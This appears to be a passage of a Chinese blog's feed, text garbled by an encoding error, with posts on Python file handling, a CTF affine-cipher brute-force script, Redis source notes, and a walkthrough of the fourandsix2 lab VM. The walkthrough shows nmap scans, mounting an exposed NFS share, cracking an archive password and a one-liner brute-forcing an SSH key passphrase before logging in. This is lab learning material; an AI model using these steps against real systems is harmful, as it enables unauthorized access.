    <content type="html"><![CDATA[<h2>pythonæ–‡ä»¶æ“ä½œ</h2><p>è¯»æ–‡ä»¶ï¼Œä½¿ç”¨<code>open</code>å‡½æ•°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¦‚æœä¸æŒ‡å®šæ¨¡å¼ï¼Œåˆ™é»˜è®¤ä»¥ text mode æ‰“å¼€</p><blockquote><p>è¿™æ„å‘³ç€ä»æ–‡ä»¶ä¸­è¯»å–æˆ–å†™å…¥å­—ç¬¦ä¸²æ—¶ï¼Œéƒ½ä¼šä»¥æŒ‡å®šçš„ç¼–ç æ–¹å¼è¿›è¡Œç¼–ç ã€‚å¦‚æœæœªæŒ‡å®šç¼–ç æ ¼å¼ï¼Œé»˜è®¤å€¼ä¸å¹³å°ç›¸å…³</p></blockquote><p><code>read()</code>æ–¹æ³•ï¼Œå¯é€‰å‚æ•°<code>size</code>ï¼Œå½“ size è¢«çœç•¥æˆ–è€…ä¸ºè´Ÿçš„æ—¶å€™ï¼Œå°†è¯»å–å¹¶è¿”å›æ–‡ä»¶çš„æ•´ä¸ªå†…å®¹</p><p><code>readline()</code>æ–¹æ³•ï¼Œä»æ–‡ä»¶ä¸­è¯»å–ä¸€è¡Œ</p><p>å¦‚æœè¦éå†æ–‡ä»¶ï¼Œå¯ä»¥é‡‡å–éå†æ–‡ä»¶å¯¹è±¡çš„æ–¹å¼ï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line"><span class="meta">... </span>    print(line, end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure></p><p>è¿™ç§å®ç°æ–¹å¼æ¯”è¾ƒé«˜æ•ˆ</p><p>åœ¨ç¼–å†™è„šæœ¬çš„è¿‡ç¨‹ä¸­ï¼Œæ³¨æ„æ–‡ä»¶çš„æ‰“å¼€æ–¹å¼ï¼Œç¼–ç è¿™äº›å°ç»†èŠ‚</p><p>å†™æ–‡ä»¶</p><blockquote><p>f.write(string) ä¼šæŠŠ string çš„å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œå¹¶è¿”å›å†™å…¥çš„å­—ç¬¦æ•°ã€‚</p></blockquote><blockquote><p>f.tell() è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œç»™å‡ºæ–‡ä»¶å¯¹è±¡åœ¨æ–‡ä»¶ä¸­çš„å½“å‰ä½ç½®ï¼Œè¡¨ç¤ºä¸ºäºŒè¿›åˆ¶æ¨¡å¼ä¸‹æ—¶ä»æ–‡ä»¶å¼€å§‹çš„å­—èŠ‚æ•°ï¼Œä»¥åŠæ–‡æœ¬æ¨¡å¼ä¸‹çš„ä¸é€æ˜æ•°å­—ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;pythonæ–‡ä»¶æ“ä½œ&lt;/h2&gt;
&lt;p&gt;è¯»æ–‡ä»¶ï¼Œä½¿ç”¨&lt;code&gt;open&lt;/code&gt;å‡½æ•°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶
å¦‚æœä¸æŒ‡å®šæ¨¡å¼ï¼Œåˆ™é»˜è®¤ä»¥ text mode æ‰“å¼€&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™æ„å‘³ç€ä»æ–‡ä»¶ä¸­è¯»å–æˆ–å†™å…¥å­—ç¬¦ä¸²æ—¶ï¼Œéƒ½ä¼šä»¥æŒ‡å®šçš„ç¼–ç æ–¹å¼è¿›è¡Œç¼–ç ã€‚å¦‚æœæœªæŒ‡å®šç¼–
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="python" scheme="https://prontosil.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>cybricså¤ç°</title>
    <link href="https://prontosil.club/2019/07/31/cybrics%E5%A4%8D%E7%8E%B0/"/>
    <id>https://prontosil.club/2019/07/31/cybricså¤ç°/</id>
    <published>2019-07-31T12:52:25.000Z</published>
    <updated>2019-07-31T12:53:44.973Z</updated>
    
    <content type="html"><![CDATA[<p>ç›®å‰å¤ªèœäº†ï¼Œæ²¡åšå‡ºå‡ é“cybricsçš„é¢˜ç›®ï¼Œè¶ç€é¢˜ç›®è¿˜åœ¨å¤ç°ä¸€æ³¢</p><h2>Zakukozh</h2><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/cybrics0.png" alt=""><a href="https://dystopia.sg/files/zakukozh.bin" target="_blank" rel="noopener">ä¸‹è½½åœ°å€</a></p><p>ä¸‹è½½äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯æƒ³æŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼š</p><p><code>zakukozh.bin: data</code></p><p>é¢˜ç›®ä¸­æœ‰æç¤ºè¯´æ˜¯<code>affine cipher</code></p><p><code>affine cipher</code>ä¸­æ–‡ç¿»è¯‘è¿‡æ¥å°±æ˜¯æ”¾å°„å¯†ç ï¼Œå¯ä»¥ç†è§£æˆç®€å•çš„æ›¿æ¢åŠ å¯†ï¼Œæ¯”å¦‚wikipediaä¸Šä¸¾å‡ºçš„<a href="https://en.wikipedia.org/wiki/Affine_cipher#Examples" target="_blank" rel="noopener">æ —å­</a></p><blockquote><p>ä¸€ä¸ªå¤§å°ä¸ºmçš„å­—æ¯è¡¨ï¼Œé€šè¿‡å˜æ¢ $E(x) = (ax+b) mod , m$ å¾—åˆ°å¯†æ–‡</p></blockquote><p>æŸ¥çœ‹æ–‡ä»¶çš„åå…­è¿›åˆ¶å½¢å¼ï¼Œå­¦ä¹ ä¸€äº›<code>hexdump</code>å‘½ä»¤</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pxy@LAPTOP-UBIEP4K5 î‚° /mnt/f/1.ctf/cybrics/crypto î‚° hexdump -C zakukozh.bin| head</span><br><span class="line">00000000  60 09 eb 82 1c ef df ef  59 59 59 1c a0 91 55 27  |`.......YYY...U&apos;|</span><br><span class="line">00000010  59 59 77 bc 59 59 59 2e  d1 77 59 59 59 a9 44 38  |YYw.YYY..wYYY.D8|</span><br><span class="line">00000020  31 59 59 59 68 16 27 82  37 59 8b 6b fd 00 59 59  |1YYYh.&apos;.7Y.k..YY|</span><br><span class="line">00000030  59 95 62 28 dc 28 59 59  b8 ba fe 1d 08 a4 59 59  |Y.b(.(YY......YY|</span><br><span class="line">00000040  59 e0 e9 91 90 16 59 59  2b c6 59 59 2b c6 68 02  |Y.....YY+.YY+.h.|</span><br><span class="line">00000050  da 31 35 59 59 fe 7e a0  55 28 45 61 db 3c 3d 10  |.15YY.~.U(Ea.&lt;=.|</span><br><span class="line">00000060  08 a6 a1 a3 a4 89 ab 3e  68 b0 1b 82 a6 35 fd cd  |.......&gt;h....5..|</span><br><span class="line">00000070  1c e0 d9 de 59 67 7f e3  45 70 b0 e2 e6 22 55 17  |....Yg..Ep...&quot;U.|</span><br><span class="line">00000080  32 d9 de 3e 87 1d d2 c2  59 51 e7 e6 59 49 a2 82  |2..&gt;....YQ..YI..|</span><br><span class="line">00000090  68 39 eb ab 77 19 7d fd  a4 d9 a1 b0 ef 59 f8 07  |h9..w.&#125;......Y..|</span><br></pre></td></tr></table></figure></p><p>æŸ¥çœ‹åå…­è¿›åˆ¶æ•°æ®å¦‚ä¸Šï¼Œæ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œè¿™å°±æ˜¯ä»¿å°„åŠ å¯†ä¹‹åçš„ç»“æœï¼Œé‚£ä¹ˆå¦‚ä½•ç¡®å®ša,b,mè¿™ä¸‰ä¸ªå‚æ•°</p><p>ç”±äºæ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œé‚£ä¹ˆmå°±æ˜¯256aå’Œbå°±é€šè¿‡çˆ†ç ´æ¥è§£å†³</p><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reffine</span><span class="params">(a, b, c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr((a * (ord(c) - b)) % <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'zakukozh.bin'</span>) <span class="keyword">as</span> f:</span><br><span class="line">encrypted = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        decrypted = <span class="string">''</span>.join([reffine(i, j, c) <span class="keyword">for</span> c <span class="keyword">in</span> encrypted])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'output/dec_&#123;&#125;_&#123;&#125;.out'</span>.format(i, j), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decrypted)</span><br></pre></td></tr></table></figure></p><p>å°±æ˜¯è·‘çš„å¤ªæ…¢äº† ğŸ˜‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç›®å‰å¤ªèœäº†ï¼Œæ²¡åšå‡ºå‡ é“cybricsçš„é¢˜ç›®ï¼Œè¶ç€é¢˜ç›®è¿˜åœ¨å¤ç°ä¸€æ³¢&lt;/p&gt;
&lt;h2&gt;Zakukozh&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinyongpeng/gitpic/master/cybrics0.
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
      <category term="cybrics" scheme="https://prontosil.club/tags/cybrics/"/>
    
  </entry>
  
  <entry>
    <title>redisæºç é˜…è¯»â€”â€”dict</title>
    <link href="https://prontosil.club/2019/07/30/redis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94dict/"/>
    <id>https://prontosil.club/2019/07/30/redisæºç é˜…è¯»â€”â€”dict/</id>
    <published>2019-07-30T15:31:53.000Z</published>
    <updated>2019-07-30T16:02:23.958Z</updated>
    
    <content type="html"><![CDATA[<h2>dictç±»å‹</h2><p>å…ˆçœ‹å®å®šä¹‰</p><p>æœ€åŸºæœ¬çš„æ˜¯dictç±»å‹ï¼Œå¦‚ä¸‹ï¼š</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct dict &#123;</span><br><span class="line">    dictType *type;</span><br><span class="line">    void *privdata;</span><br><span class="line">    dictht ht[2];</span><br><span class="line">    PORT_LONG rehashidx; /* rehashing not in progress if rehashidx == -1 */</span><br><span class="line">    int iterators; /* number of iterators currently running */</span><br><span class="line">&#125; dict;</span><br></pre></td></tr></table></figure></p><ul><li>dictType æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼ŒåŒ…å«äº†dictçš„ä¸€äº›åŸºç¡€æ–¹æ³•</li><li>privdata æ˜¯ç§æœ‰æ•°æ®</li><li>dictht æ˜¯å“ˆå¸Œè¡¨</li><li>rehashidx ä»£è¡¨æ˜¯å¦åœ¨è¿›è¡Œé‡å“ˆå¸Œï¼Œå¦‚æœä¸ä¸º-1åˆ™ä»£è¡¨æ­£åœ¨è¿›è¡Œé‡å“ˆå¸Œ</li><li>iterators ä»£è¡¨è¿­ä»£å™¨ï¼Œæš‚æ—¶è¿˜ä¸å¤ªç†è§£</li></ul><p>æ¥ä¸‹æ¥çœ‹å“ˆå¸Œè¡¨çš„ç»“æ„(dictht):</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct dictht &#123;</span><br><span class="line">    dictEntry **table;</span><br><span class="line">    PORT_ULONG size;</span><br><span class="line">    PORT_ULONG sizemask;</span><br><span class="line">    PORT_ULONG used;</span><br><span class="line">&#125; dictht;</span><br></pre></td></tr></table></figure></p><ul><li>tableæ˜¯ä¸€ä¸ªæŒ‡å‘<code>dictEntry</code>çš„äºŒçº§æŒ‡é’ˆ</li><li>sizeä»£è¡¨å“ˆå¸Œè¡¨çš„å¤§å°</li><li>sizemask æ€»æ˜¯ç­‰äºsize-1</li><li>usedä»£è¡¨è¯¥å“ˆå¸Œè¡¨å·²æœ‰çš„èŠ‚ç‚¹æ•°é‡</li></ul><p>è¿™æ˜¯<code>dictht</code>çš„æ„é€ ï¼š<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/graphviz-bd3eecd927a4d8fc33b4a1c7f5957c52d67c5021.png" alt=""></p><p>ä¸è¿‡è¿™é‡Œä¸ºä»€ä¹ˆè¦äºŒçº§æŒ‡é’ˆå‘¢ï¼Ÿ</p><blockquote><p>å¯ä»¥è¿™æ ·ç†è§£ï¼Œå› ä¸º<code>dictEntry *</code>æœ¬èº«å°±æ˜¯ä¸€ä¸ªä¸€çº§æŒ‡é’ˆï¼ŒåŒæ—¶<code>table</code>æŒ‡å‘çš„åˆæ˜¯ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦äºŒçº§æŒ‡é’ˆäº†</p></blockquote><h3>å¤ä¹ ä¸€ä¸‹æ•°ç»„æŒ‡é’ˆå’ŒæŒ‡é’ˆæ•°ç»„çš„æ¦‚å¿µ</h3><p>æ•°ç»„æŒ‡é’ˆï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯æŒ‡é’ˆ</p><p><code>int (*p)[n]</code><code>()</code>è¿ç®—ä¼˜å…ˆçº§æ›´é«˜ï¼Œ<code>*</code>ä¼˜å…ˆä¸pç»“åˆï¼Œpè¿˜æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œä¸è¿‡pæŒ‡å‘çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¿™æ—¶å€™<code>p+1</code>è¿ç®—çš„æ­¥é•¿å°±æ˜¯<code>n</code>,æ•…è¿™æ ·çš„æŒ‡é’ˆä¹Ÿå«è¡ŒæŒ‡é’ˆ</p><p>æŒ‡é’ˆæ•°ç»„<code>int *p[n]</code><code>[]</code>ä¼˜å…ˆçº§æ›´é«˜ï¼Œpå…ˆä¸æ–¹æ‹¬å·ç»“åˆï¼Œè¿™æ—¶å€™pä»£è¡¨çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œæ•…æ­¤æ—¶på°±æ˜¯äºŒçº§æŒ‡é’ˆ</p><p>ä¹‹åç»§ç»­çœ‹<code>dictEntry</code>ç±»å‹</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef struct dictEntry &#123;</span><br><span class="line">    void *key;</span><br><span class="line">    union &#123;</span><br><span class="line">        void *val;</span><br><span class="line">        uint64_t u64;</span><br><span class="line">        int64_t s64;</span><br><span class="line">        double d;</span><br><span class="line">    &#125; v;</span><br><span class="line">    struct dictEntry *next;</span><br><span class="line">&#125; dictEntry;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œé¢å­˜å‚¨äº†key-valueé”®å€¼å¯¹ï¼Œå…¶ä¸­<code>key</code>æ˜¯ä¸€ä¸ª<code>void*</code>ç±»å‹çš„æŒ‡é’ˆï¼Œå¯ä»¥ä»£è¡¨ä»»æ„ç±»å‹çš„æ•°æ®ï¼Œä½†æ˜¯<code>value</code>æ˜¯ä¸€ä¸ªè”åˆä½“ï¼Œå¯ä»¥åœ¨æŒ‡é’ˆï¼Œæ•´æ•°å’Œæµ®ç‚¹æ•°ä¸­å–å€¼</p><p><code>next</code>å±æ€§æ˜¯æŒ‡å‘å¦ä¸€ä¸ªå“ˆå¸Œè¡¨èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œ è¿™ä¸ªæŒ‡é’ˆå¯ä»¥å°†å¤šä¸ªå“ˆå¸Œå€¼ç›¸åŒçš„é”®å€¼å¯¹è¿æ¥åœ¨ä¸€æ¬¡ï¼Œ ä»¥æ­¤æ¥è§£å†³é”®å†²çªï¼ˆcollisionï¼‰çš„é—®é¢˜</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dictentry.png" alt=""></p><h2>å‚è€ƒ</h2><p><a href="http://redisbook.com/preview/dict/datastruct.html" target="_blank" rel="noopener">å­—å…¸çš„å®ç°</a><a href="http://zhangtielei.com/posts/blog-redis-dict.html" target="_blank" rel="noopener">Rediså†…éƒ¨æ•°æ®ç»“æ„è¯¦è§£(1)â€”â€”dict</a><a href="https://www.cnblogs.com/hongcha717/archive/2010/10/24/1859780.html" target="_blank" rel="noopener">æ•°ç»„æŒ‡é’ˆå’ŒæŒ‡é’ˆæ•°ç»„çš„åŒºåˆ«</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;dictç±»å‹&lt;/h2&gt;
&lt;p&gt;å…ˆçœ‹å®å®šä¹‰&lt;/p&gt;
&lt;p&gt;æœ€åŸºæœ¬çš„æ˜¯dictç±»å‹ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="C" scheme="https://prontosil.club/tags/C/"/>
    
      <category term="redis" scheme="https://prontosil.club/tags/redis/"/>
    
      <category term="dict" scheme="https://prontosil.club/tags/dict/"/>
    
  </entry>
  
  <entry>
    <title>redisæºç é˜…è¯»â€”â€”sds</title>
    <link href="https://prontosil.club/2019/07/30/redis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94sds/"/>
    <id>https://prontosil.club/2019/07/30/redisæºç é˜…è¯»â€”â€”sds/</id>
    <published>2019-07-30T15:27:03.000Z</published>
    <updated>2019-07-30T16:02:26.090Z</updated>
    
    <content type="html"><![CDATA[<h2>ä»redisæºç å¼€å§‹</h2><p>éƒ½è¯´å†™ä»£ç æ˜¯åœ¨è¡¨è¾¾è‡ªå·±ï¼Œé˜…è¯»ä»£ç æ˜¯åœ¨ç†è§£åˆ«äººï¼Œå°¤å…¶æ˜¯é˜…è¯»é«˜è´¨é‡çš„æºä»£ç ï¼Œäºæ˜¯ä¾¿ä»å¤´å¼€å§‹è¯»èµ·äº†redisçš„æºç </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;ä»redisæºç å¼€å§‹&lt;/h2&gt;
&lt;p&gt;éƒ½è¯´å†™ä»£ç æ˜¯åœ¨è¡¨è¾¾è‡ªå·±ï¼Œé˜…è¯»ä»£ç æ˜¯åœ¨ç†è§£åˆ«äººï¼Œå°¤å…¶æ˜¯é˜…è¯»é«˜è´¨é‡çš„æºä»£ç ï¼Œäºæ˜¯ä¾¿ä»å¤´å¼€å§‹è¯»èµ·äº†redisçš„æºç &lt;/p&gt;

      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="C" scheme="https://prontosil.club/tags/C/"/>
    
      <category term="redis" scheme="https://prontosil.club/tags/redis/"/>
    
      <category term="sds" scheme="https://prontosil.club/tags/sds/"/>
    
  </entry>
  
  <entry>
    <title>é¶æœºæ¸—é€</title>
    <link href="https://prontosil.club/2019/07/30/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://prontosil.club/2019/07/30/é¶æœºæ¸—é€/</id>
    <published>2019-07-30T15:00:04.000Z</published>
    <updated>2019-07-30T15:01:18.808Z</updated>
    
    <content type="html"><![CDATA[<h2>fourandsix2é¶æœº</h2><p>ä¸€å¼€æœºå°±å¯ä»¥çœ‹åˆ°IPåœ°å€ä½192.168.41.132</p><p>ç„¶ånmapå¼€å§‹æ‰«æ<code>nmap -A -n -v -Pn -A 192.168.41.132</code>-A Enable OS detection, version detection, script scanning, and traceroute-n -n/-R: Never do DNS resolution/Always resolve [default: sometimes]-Pn  Treat all hosts as online -- skip host discovery</p><p>æ‰«æçš„æŠ¥å‘Šï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.41.132</span><br><span class="line">Host is up (0.00059s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)</span><br><span class="line">|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)</span><br><span class="line">|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)</span><br><span class="line">111/tcp  open  rpcbind 2 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100003  2,3         2049/tcp  nfs</span><br><span class="line">|   100003  2,3         2049/udp  nfs</span><br><span class="line">|   100005  1,3          780/udp  mountd</span><br><span class="line">|_  100005  1,3          917/tcp  mountd</span><br><span class="line">2049/tcp open  nfs     2-3 (RPC #100003)</span><br><span class="line">MAC Address: 00:0C:29:81:23:53 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: OpenBSD 6.X</span><br><span class="line">OS CPE: cpe:/o:openbsd:openbsd:6</span><br><span class="line">OS details: OpenBSD 6.0 - 6.1</span><br><span class="line">Uptime guess: 0.000 days (since Sat Jul 20 02:04:15 2019)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=258 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Randomized</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.59 ms 192.168.41.132</span><br></pre></td></tr></table></figure></p><p>éš¾å¾—ä¸€æ¬¡nmapå¯ä»¥æ‰«å‡ºè¿™ä¹ˆå¤šä¿¡æ¯çœ‹åˆ°é¶æœºå¼€æ”¾äº†2049å·ç«¯å£ï¼Œæ˜¯nfsæœåŠ¡ï¼Œé‚£ä¹ˆå°è¯•æ‰«æå¯ä»¥æŒ‚è½½çš„ç›®å½•</p><ul><li>-sV : Probe open ports to determine service/version info</li></ul><p><code>nmap -sV --script=nfs-showmount 192.168.41.132</code>æ‰«æå¯ä»¥æŒ‚è½½çš„ç›®å½•</p><p>ç»“æœï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)</span><br><span class="line">111/tcp  open  rpcbind 2 (RPC #100000)</span><br><span class="line">| nfs-showmount:</span><br><span class="line">|_  /home/user/storage</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100003  2,3         2049/tcp  nfs</span><br><span class="line">|   100003  2,3         2049/udp  nfs</span><br><span class="line">|   100005  1,3          780/udp  mountd</span><br><span class="line">|_  100005  1,3          917/tcp  mountd</span><br><span class="line">2049/tcp open  nfs     2-3 (RPC #100003)</span><br><span class="line">MAC Address: 00:0C:29:81:23:53 (VMware)</span><br></pre></td></tr></table></figure></p><p>å¾ˆå¥½ï¼Œé‚£å°±å¯ä»¥æŒ‚è½½ç›®å½•äº†</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nfspysh -o server=192.168.41.132:/home/user/storage /tmp/test/</span><br><span class="line">nfspy@192.168.41.132:/home/user/storage:/&gt;</span><br></pre></td></tr></table></figure></p><p>nfspyshçš„ç”¨æ³•ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nfspysh -h</span><br><span class="line">Usage: nfspysh [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help  show this help message and exit</span><br><span class="line">  -l          List mount options available</span><br><span class="line">  -o OPTIONS  Mount options as in nfspy</span><br><span class="line">  -c COMMAND  Semicolon-separated commands to run (batch mode)</span><br></pre></td></tr></table></figure></p><p>ç›®å½•ä¸‹æœ‰ä¸€ä¸ªå‹ç¼©åŒ…<code>get backup.7z</code>ç„¶åå°è¯•ç”¨7zå»è§£å‹ç¼©ï¼Œä½†æ˜¯æœ‰å¯†ç </p><p>äºæ˜¯ç”¨<code>john</code>å»ç ´è§£</p><p>ç„¶è€Œçˆ†ç ´æœ‰ç‚¹æ…¢</p><p>ä¸è¿‡å¯†ç å°±æ˜¯<code>chocolate</code></p><p>ps.kalié‡Œé¢å…¶å®æœ‰å¾ˆå¤šå­—å…¸çš„ï¼Œæ¯”å¦‚<code>/usr/share/john/password.lst</code></p><p>è§£å‹ç¼©ä¹‹åå¾—åˆ°çš„æ˜¯ä¸€ä¸ªå…¬é’¥å’Œç§é’¥</p><p>é€šè¿‡ä¸‹é¢è¿™æ®µè„šæœ¬çˆ†ç ´å‡ºå¯†ç æ˜¯12345678<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;user@192.168.41.132&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure></p><p>ç„¶åå°±å¯ä»¥ç™»é™†äº†<code>ssh -i id_rsa user@192.168.41.132</code></p><p>ä¹‹å‰ä¸€ç›´å°è¯•æ²¡ç™»é™†æˆåŠŸï¼Œå› ä¸ºæˆ‘å¿˜è®°èµ‹æƒäº†ä¹Ÿå°±æ˜¯<code>chmod 600 id_rsa</code></p><p>ç„¶åå°±å¯ä»¥ç™»é™†äº†ï¼š<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# ssh -i id_rsa user@192.168.41.132</span><br><span class="line">Enter passphrase for key &apos;id_rsa&apos;:</span><br><span class="line">Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114</span><br><span class="line">OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018</span><br><span class="line"></span><br><span class="line">Welcome to OpenBSD: The proactively secure Unix-like operating system.</span><br><span class="line"></span><br><span class="line">Please use the sendbug(1) utility to 